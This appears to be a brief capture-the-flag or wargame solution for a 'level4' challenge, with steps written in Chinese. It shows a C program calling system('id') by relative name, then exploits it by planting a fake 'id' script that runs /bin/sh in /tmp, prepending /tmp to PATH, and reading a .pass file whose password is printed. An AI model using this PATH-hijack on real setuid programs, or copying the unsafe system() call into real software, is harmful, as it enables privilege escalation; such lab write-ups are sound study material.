include <stdlib.h>

int main() 
{
    system("id");
    return 0;
}

在/tmp下创建一个名字叫id的shell文件，内容为/bin/sh，然后chmod a+x id
export PATH=/tmp:$PATH
./level4

cat .pass
Zx5VdzACNMY9lQ
